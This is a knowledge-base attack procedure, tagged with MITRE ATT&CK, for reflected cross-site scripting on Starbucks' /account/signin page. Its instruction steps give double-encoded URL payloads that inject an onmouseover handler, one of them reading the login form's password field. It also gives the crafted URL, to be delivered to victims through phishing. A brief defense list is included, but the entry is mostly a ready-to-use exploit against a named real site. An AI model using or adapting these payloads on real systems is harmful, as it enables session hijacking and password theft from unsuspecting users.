---
tags:
  - xss
  - url-injection
  - payload-crafting
type: procedure
tools:
  - '[[tools/Chrome]]'
  - '[[tools/Firefox]]'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:55:06.891Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
id: 88ca3ba8-70db-45ea-ac71-732e55d12c1d
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
---
# Craft-and-Navigate-to-Malicious-XSS-URL

## Summary

This procedure involves encoding and injecting a malicious JavaScript payload into the URL path of the Starbucks login page, exploiting improper escaping in ASP.NET URI handling to embed an onmouseover event handler for later execution.

## Description

The Starbucks login page at /account/signin constructs internal links using the URL path, but fails to escape special characters, allowing attackers to break out of HTML attributes (e.g., href="...") and inject event handlers like onmouseover. The attack scenario targets users tricked into visiting the crafted URL (e.g., via phishing). In a web environment, this leads to JavaScript execution in the page context upon interaction. Prerequisites: Browser prepared and target URL known.

## Requirements

1. Knowledge of the vulnerable endpoint (/account/signin)
2. URL encoding tools or manual encoding skills
3. Browser access to the site

## Defense

Defensive measures and detection strategies:

- Properly encode and validate URL paths server-side using libraries like OWASP ESAPI
- Deploy Web Application Firewall (WAF) rules to block suspicious URL patterns with encoded payloads
- Log and monitor access to login pages for unusual query parameters

## Objectives

1. Deliver the XSS payload via reflected URL injection
2. Embed JavaScript in page elements without direct errors
3. Set up for payload triggering to access form data

## Instructions

### Step 1: Encode the Payload

**Context**: Create the breakout string to inject onmouseover="alert(...)" into the href attribute.

Manually encode: For domain alert, use %22%20%252fonmouseover=%22alert%25%32%38%64%6f%63%75%6d%65%6e%74.%64%6f%6d%61%69%6e%25%32%39%22. For password theft: %22%20%252fonmouseover=%22%2561%256c%2565%2572%2574%2528%2564%256f%2563%2575%256d%2565%256e%2574%252e%2567%2565%2574%2545%256c%2565%256d%2565%256e%2574%2573%2542%2579%254e%2561%256d%2565%2528%2527%2541%2563%2563%256f%2575%256e%2574%252e%2550%2561%2573%2573%2557%256f%2572%2564%2527%2529%255b%2530%255d%252e%2576%2561%256c%2575%2565%2529%22.

> Expected output: Encoded string ready for URL insertion.

### Step 2: Construct and Navigate to URL

**Context**: Insert the encoded payload into the path and load in browser.

Enter in address bar: https://www.starbucks.com/account/(A([encoded payload]))/signin.

> Expected output: Page loads with injected link in source (inspect via DevTools).

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Chrome]]
- [[tools/Firefox]]

## Tags

- [[xss]]
- [[url-injection]]
